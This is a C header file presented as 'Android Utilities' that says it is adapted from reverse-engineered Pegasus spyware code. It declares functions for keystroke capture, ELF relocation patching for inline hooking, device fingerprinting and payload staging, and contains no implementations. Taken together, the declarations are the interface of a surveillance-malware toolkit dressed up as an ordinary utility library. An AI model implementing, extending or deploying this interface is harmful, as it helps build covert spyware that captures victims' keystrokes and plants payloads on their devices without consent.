// graphite_android.h - Android Utilities (C)
// Adapted from Pegasus (libk/libsgn) reverse-engineered native code
// Features: parcel parsing, keystroke capture, ELF loading, inline hooking

#ifndef GRAPHITE_ANDROID_H
#define GRAPHITE_ANDROID_H

#include <stddef.h>
#include <stdint.h>

#ifdef _WIN32
    #define ANDROID_EXPORT __declspec(dllexport)
#else
    #define ANDROID_EXPORT __attribute__((visibility("default")))
#endif

#ifdef __cplusplus
extern "C" {
#endif

// Parcel parsing
typedef struct {
    const uint8_t *data;
    size_t size;
    size_t pos;
} parcel_view_t;

ANDROID_EXPORT parcel_view_t parcel_view_from_bytes(const uint8_t *data, size_t size, size_t pos);
ANDROID_EXPORT int parcel_read_int32(parcel_view_t *pv, int32_t *out);
ANDROID_EXPORT int parcel_read_string16(parcel_view_t *pv, const uint16_t **out, size_t *char16_len);

// Keystroke capture
ANDROID_EXPORT void capture_keystrokes(int char16_len, const uint16_t *utf16_buf);

// MD5 (from Pegasus libsgn fingerprint.c)
ANDROID_EXPORT void md5_sum(uint8_t digest[16], const void *data, uint32_t len);
ANDROID_EXPORT void get_hexlified_md5(const void *data, char *out_hex, uint32_t len);

// ELF loading
ANDROID_EXPORT int elf_patch_reloc(const char *lib_path, void *loaded_base, unsigned sym_index,
                                   void *hook_addr, void **original_out);

// File staging
ANDROID_EXPORT int stage_payload(const void *buf, size_t len, const char *path);
ANDROID_EXPORT int file_exists(const char *path, int *out_exists);

#ifdef __cplusplus
}
#endif

#endif
